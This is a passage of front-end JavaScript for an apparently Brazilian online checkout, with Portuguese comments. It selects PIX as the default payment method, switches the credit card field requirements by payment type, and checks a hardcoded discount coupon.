 * e que o estado JavaScript esteja sincronizado com o HTML
 */
function initializePaymentMethod() {
    // Encontra o elemento PIX (que já tem a classe .selected no HTML)
    const pixPaymentMethod = document.querySelector('.payment-method[data-payment="pix"]');
    
    if (pixPaymentMethod) {
        // Encontra o header dentro do elemento PIX
        const pixHeader = pixPaymentMethod.querySelector('.payment-header');
        
        if (pixHeader) {
            // Simula um clique no header para disparar selectPayment()
            // Isto garante que toda a lógica de seleção seja executada
            pixHeader.click();
        }
    }
}

function selectPayment() {
    document.querySelectorAll(".payment-method").forEach(method => {
        method.classList.remove("selected");
    });
    this.parentElement.classList.add("selected");
    selectedPayment = this.parentElement.dataset.payment;

    const creditCardFields = [
        document.getElementById("cardNumber"),
        document.getElementById("cardName"),
        document.getElementById("cardExpiry"),
        document.getElementById("cardCvv"),
        document.getElementById("installments")
    ];

    if (selectedPayment === "pix" || selectedPayment === "boleto") {
        creditCardFields.forEach(field => {
            if (field) {
                field.removeAttribute("required");
                field.classList.remove("error", "success");
                const errorEl = document.getElementById(field.id + "Error");
                if (errorEl) errorEl.classList.remove("show");
            }
        });
    } else if (selectedPayment === "credit") {
        creditCardFields.forEach(field => {
            if (field) {
                field.setAttribute("required", "");
            }
        });
    }

    const creditCardNotice = document.getElementById("creditCardNotice");
    if (creditCardNotice) {
        if (selectedPayment === "credit" && currentStep === 3) {
            creditCardNotice.style.display = "block";
        } else {
            creditCardNotice.style.display = "none";
        }
    }

    updateShippingCost();
}

function applyCoupon() {
    const couponInput = document.getElementById('discountInput');
    const coupon = couponInput.value.trim().toUpperCase();
    
    if (coupon === 'DESCONTO10') {
        showSuccessNotification('Cupom aplicado! 10% de desconto');
        couponInput.value = '';
    } else if (coupon) {
        alert('Cupom inválido');
    }
}
